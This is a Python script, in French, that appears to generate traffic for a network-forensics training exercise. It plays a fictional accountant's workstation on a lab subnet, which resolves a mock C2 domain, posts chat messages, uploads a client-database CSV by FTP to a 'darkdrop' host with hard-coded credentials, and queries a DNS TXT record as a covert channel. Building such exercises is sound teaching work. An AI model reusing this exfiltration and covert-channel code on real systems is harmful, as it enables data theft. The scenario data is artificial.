#!/usr/bin/env python3
"""Poste de Marc Vidal (comptable) - 10.13.37.10.

Timeline :
  - reconnaissance DNS (resolution des domaines) vers le C2
  - participe au chat de coordination (P1)
  - exfiltre la base clients par FTP vers darkdrop (P2)
  - interroge un enregistrement TXT : canal cache DNS (P5)
"""
import ftplib
import socket
import time
import urllib.parse
import urllib.request

from dnslib import DNSRecord

SRV = "10.13.37.50"
DARKDROP = "10.13.37.200"
CSV = "/opt/scenario/data/clients_nordexport.csv"


def dns_query(name, qtype="A"):
    q = DNSRecord.question(name, qtype)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5)
    s.sendto(q.pack(), (DARKDROP, 53))
    try:
        data, _ = s.recvfrom(4096)
        return DNSRecord.parse(data)
    except socket.timeout:
        return None
    finally:
        s.close()


def chat(auteur, texte):
    data = urllib.parse.urlencode({"auteur": auteur, "texte": texte}).encode()
    req = urllib.request.Request("http://%s/post" % SRV, data=data)
    urllib.request.urlopen(req, timeout=5).read()


def sleep_until(t0, offset):
    delay = offset - (time.time() - t0)
    if delay > 0:
        time.sleep(delay)


def main():
    t0 = time.time()

    # --- Reconnaissance DNS ---
    sleep_until(t0, 6)
    for name in ("srv-nordexport.lan", "darkdrop-exchange.net", "panel.darkdrop-exchange.net"):
        dns_query(name, "A")
        time.sleep(0.4)

    # --- Reponses dans le chat (P1) ---
    # Marc corrobore les faits de la livraison : son poste (.10) confirme le
    # transporteur, la date et le numero de colis annonces par Sofia (.20).
    sleep_until(t0, 11)
    chat("Marc", "Marc Vidal, bien en ligne. Vas-y, je note tout.")
    sleep_until(t0, 18)
    chat("Marc", "Transports Caron, ok. On part bien sur la nuit du 14/05 a 03h00 ?")
    sleep_until(t0, 28)
    chat("Marc", "Recu. Colis NX-4417 note, je prepare le bordereau.")

    # --- Exfiltration de la base clients par FTP (P2) ---
    sleep_until(t0, 30)
    ftp = ftplib.FTP()
    ftp.connect(DARKDROP, 21, timeout=10)
    ftp.login("depot", "Pr1nt3mps2026!")
    ftp.set_pasv(True)
    with open(CSV, "rb") as f:
        ftp.storbinary("STOR clients_nordexport.csv", f)
    ftp.quit()

    # Recoupement inter-scelles (defi bonus) : l'effacement annonce ici (scelle
    # 01, chat HTTP) suit immediatement le STOR FTP ci-dessus (scelle 02).
    sleep_until(t0, 34)
    chat("Marc", "Fichier pousse sur le depot darkdrop. J'efface l'historique local.")

    # --- Canal cache : requete TXT vers le C2 (P5) ---
    sleep_until(t0, 50)
    dns_query("status.darkdrop-exchange.net", "TXT")

    print("marc: termine")


if __name__ == "__main__":
    main()
